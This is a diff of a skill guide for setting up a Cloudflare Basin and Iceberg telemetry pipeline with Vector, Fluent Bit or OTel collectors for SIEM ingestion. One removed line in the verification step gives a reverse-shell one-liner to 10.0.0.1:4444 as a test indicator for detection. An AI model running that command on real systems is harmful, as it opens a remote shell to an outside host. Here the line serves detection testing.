@@ -1,64 +1,67 @@
 ---
 name: setup-cloudflare-basin-iceberg
 description: >-
-  Use this skill when provisioning Cloudflare R2, Basin Catalog, Basin Stream,
-  Iceberg Sink, Basin Pipeline, and deploying the ingest Worker and Vector collector
-  to store systemd-journald telemetry into Apache Iceberg.
+  Use this skill when provisioning Cloudflare R2, Basin Catalog, authenticated
+  OCSF Basin Stream (direct-basin-http), Iceberg Sink, Basin Pipeline, and
+  configuring Vector, Fluent Bit, or OpenTelemetry Collector to store telemetry
+  into Apache Iceberg.
 ---
 
 # Setup Cloudflare Basin Iceberg Pipeline
 
-Follow these steps to provision Cloudflare Basin resources and deploy the `journald` -> YARA -> Iceberg pipeline.
+Follow these steps to provision Cloudflare Basin resources and configure direct OCSF v1.3.0 ingestion (`journald` / `OTLP` -> `Vector` or `Fluent Bit` -> `Direct Basin HTTP` -> `Iceberg`).
 
 ## Prerequisites
 
-- Node.js + `npx wrangler` authenticated (`npx wrangler login` or `CLOUDFLARE_API_TOKEN` + `CLOUDFLARE_ACCOUNT_ID`).
-- A Basin Catalog API token stored in `BASIN_CATALOG_TOKEN` (R2 Data Catalog / Basin Catalog write token).
-- Compiled WASM YARA binary at `adapters/ingest/cloudflare-worker-basin/src/wasm/oof_yara_wasm.wasm` (built via [build-yara-wasm.sh](../manage-yara-detection/scripts/build-yara-wasm.sh)).
+- Node.js + `wrangler` (or `npx wrangler`) authenticated (`npx wrangler login` or `CLOUDFLARE_API_TOKEN` + `CLOUDFLARE_ACCOUNT_ID`).
+- A Basin Catalog API token stored in `BASIN_CATALOG_TOKEN` (R2 Data Catalog write token).
 
 ## Steps
 
 1. **Validate locally before provisioning**
    ```bash
    ./adapters/storage/cloudflare-basin-iceberg/provision-basin.sh --dry-run \
-     --bucket oof-telemetry --namespace siem --table journal_logs
+     --bucket oof-telemetry --namespace siem --table ocsf_event_log_activity
    ```
-   Verify the generated Wrangler commands and rendered `pipeline.sql`.
+   Verify the generated Wrangler commands (`--http-enabled true --http-auth true`, `--type r2-data-catalog`) and rendered [pipeline.sql](../../adapters/storage/cloudflare-basin-iceberg/pipeline.sql).
 
-2. **Provision R2, Basin Catalog, Stream, Sink, and Pipeline**
+2. **Provision R2, Basin Catalog, Stream, Iceberg Sink, and Pipeline**
    ```bash
    export BASIN_CATALOG_TOKEN="<your-catalog-token>"
    ./adapters/storage/cloudflare-basin-iceberg/provision-basin.sh \
      --bucket oof-telemetry \
      --namespace siem \
-     --table journal_logs \
-     --stream journal_stream \
-     --sink journal_iceberg_sink \
-     --pipeline journal_to_iceberg
+     --table ocsf_event_log_activity \
+     --stream ocsf_event_log_stream \
+     --sink ocsf_event_log_sink \
+     --pipeline ocsf_event_log_to_iceberg
    ```
-   (Use [pipeline-fanout.sql](../../adapters/storage/cloudflare-basin-iceberg/pipeline-fanout.sql) if you want an additional `yara_detections` Iceberg table.)
+   Copy the emitted `https://<STREAM_ID>.ingest.cloudflare.com` endpoint URL (also retrievable via `npx wrangler basin pipelines streams get ocsf_event_log_stream`).
 
-3. **Configure Worker binding and secret, then deploy**
-   - Copy the `<STREAM_ID>` emitted by `provision-basin.sh` (or run `npx wrangler basin pipelines streams list` to inspect the stream's `id`) into `pipelines[0].stream` in [wrangler.jsonc](../../adapters/ingest/cloudflare-worker-basin/wrangler.jsonc) — Wrangler expects the **Stream ID**, not the stream name.
-   - Install dependencies, run tests/typecheck, upload the ingest Bearer token, and deploy (all commands work directly from the repository root):
+3. **Create Sender API Token (`Basin Pipelines Send`)**
+   - In the Cloudflare dashboard, create an **Account API Token** with permission **`Account -> Basin Pipelines -> Send`**.
+   - Prefer short-lived or per-environment tokens (up to 500 account tokens supported); rotate tokens with zero downtime by overlapping old/new tokens before revoking old ones.
+   - Store the token in host secret management (`OOF_INGEST_TOKEN`) and never log or commit it.
+
+4. **Configure and Start Your Host Collector**
+   - **Option A — Vector (`adapters/collect/vector-journald/vector.yaml`)**:
+     Set `OOF_BASIN_ENDPOINT="https://<STREAM_ID>.ingest.cloudflare.com"` and `OOF_INGEST_TOKEN="<api-token>"`. Vector `>= 0.60` requires `--dangerously-allow-env-var-interpolation` (or `VECTOR_DANGEROUSLY_ALLOW_ENV_VAR_INTERPOLATION=true`):
      ```bash
-     npm --prefix adapters/ingest/cloudflare-worker-basin install
-     npm --prefix adapters/ingest/cloudflare-worker-basin run typecheck
-     npm --prefix adapters/ingest/cloudflare-worker-basin test
-     npm exec --prefix adapters/ingest/cloudflare-worker-basin -- wrangler secret put INGEST_AUTH_TOKEN --config adapters/ingest/cloudflare-worker-basin/wrangler.jsonc
-     npm --prefix adapters/ingest/cloudflare-worker-basin run deploy
+     VECTOR_DANGEROUSLY_ALLOW_ENV_VAR_INTERPOLATION=true \
+       vector validate --no-environment adapters/collect/vector-journald/vector.yaml
+     VECTOR_DANGEROUSLY_ALLOW_ENV_VAR_INTERPOLATION=true \
+       vector --config adapters/collect/vector-journald/vector.yaml
      ```
-
-4. **Point host collector (`Vector` or `OTel Collector`) at the Worker**
-   - Set `OOF_INGEST_URL="https://<worker-url>/v1/logs"` and `OOF_INGEST_TOKEN="<same-bearer-token>"`.
-   - Validate and start Vector with [vector.yaml](../../adapters/collect/vector-journald/vector.yaml) (Vector `0.60+`/`0.61+` requires `--dangerously-allow-env-var-interpolation` or `VECTOR_DANGEROUSLY_ALLOW_ENV_VAR_INTERPOLATION=true` when interpolating `${...}` env vars):
+   - **Option B — Fluent Bit (`adapters/collect/fluent-bit-journald/fluent-bit.conf`)**:
+     Set `OOF_BASIN_HOST="<STREAM_ID>.ingest.cloudflare.com"` (hostname only, no `https://`) and `OOF_INGEST_TOKEN="<api-token>"`:
      ```bash
-     vector validate --no-environment --dangerously-allow-env-var-interpolation adapters/collect/vector-journald/vector.yaml
-     vector --dangerously-allow-env-var-interpolation --config adapters/collect/vector-journald/vector.yaml
+     fluent-bit --dry-run -c adapters/collect/fluent-bit-journald/fluent-bit.conf
+     fluent-bit -c adapters/collect/fluent-bit-journald/fluent-bit.conf
      ```
-   - Alternatively, run OpenTelemetry Collector with [otelcol.yaml](../../adapters/collect/otel-collector-journald/otelcol.yaml) (`otlphttp/oof_logs` uses `encoding: json`, which the Worker unpacks automatically).
+   - **Option C — Co-located OTel Collector Bridge (`adapters/collect/otel-collector-journald/otelcol.yaml`)**:
+     Keep `journald` commented out in `otelcol.yaml` when Vector or Fluent Bit already reads journald. Point Vector (`OOF_OTLP_HTTP_LISTEN=127.0.0.1:4320`) or Fluent Bit (`Port 4320`) to match `OOF_OTLP_BRIDGE_ENDPOINT=http://127.0.0.1:4320`.
 
-5. **Verify Iceberg ingestion**
-   - Send a synthetic test log via `curl` (including a benign event and a test indicator like `bash -i >& /dev/tcp/10.0.0.1/4444`) and confirm HTTP `202` `{ "accepted": ..., "matched": ... }`.
-   - Wait past `--roll-interval` (default 60s), then query `siem.journal_logs` with Basin SQL or DuckDB using [siem_hunting.sql](../../adapters/storage/cloudflare-basin-iceberg/queries/siem_hunting.sql).
+5. **Verify Iceberg Ingestion**
+   - Send a compliant test OCSF array to `https://<STREAM_ID>.ingest.cloudflare.com` with `Authorization: Bearer $OOF_INGEST_TOKEN` and wait past `--roll-interval` (default `60` seconds).
+   - Query `siem.ocsf_event_log_activity` using Basin SQL or DuckDB with [siem_hunting.sql](../../adapters/storage/cloudflare-basin-iceberg/queries/siem_hunting.sql).
    - Consult [basin-troubleshooting.md](./references/basin-troubleshooting.md) if rows do not appear in Iceberg.
